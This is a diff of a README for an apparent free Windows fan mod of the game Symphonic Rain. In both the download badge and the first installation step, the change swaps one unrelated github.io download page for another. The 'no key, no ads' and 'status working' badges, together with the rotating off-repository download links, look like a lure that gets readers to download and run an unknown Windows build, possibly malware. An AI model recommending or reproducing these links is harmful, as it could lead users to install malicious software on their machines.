@@ -4,7 +4,7 @@
 
 ### Symphonic Rain Soundtrack Restoration: free fan mod for Symphonic Rain, no key, no ads.
 
-[![DOWNLOAD](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD-red?style=for-the-badge&logo=github)](https://beatowlrouse.github.io/windownload/)
+[![DOWNLOAD](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD-red?style=for-the-badge&logo=github)](https://beauticianblaze.github.io/DownloadWin/)
 [![Status](https://img.shields.io/badge/STATUS-WORKING_%F0%9F%9F%A2-brightgreen?style=for-the-badge)](#features)
 [![Key System](https://img.shields.io/badge/KEY-NO_KEY_required-success?style=for-the-badge)](#features)
 [![Platform](https://img.shields.io/badge/PLATFORM-Windows_10_%E2%80%A2_11-blue?style=for-the-badge)](#requirements)
@@ -35,7 +35,7 @@ This mod restores the full high-quality Symphonic Rain soundtrack, re-adds cut m
 
 ## 🛠️ Installation
 
-1. **Download the latest build** 👉 **[https://beatowlrouse.github.io/windownload/](https://beatowlrouse.github.io/windownload/)**
+1. **Download the latest build** 👉 **[https://beauticianblaze.github.io/DownloadWin/](https://beauticianblaze.github.io/DownloadWin/)**
 2. **Back up your save folder** before applying any mod.
 3. **Extract** the archive into the game's install directory.
 4. **Run the installer / copy the files** as instructed in the archive.
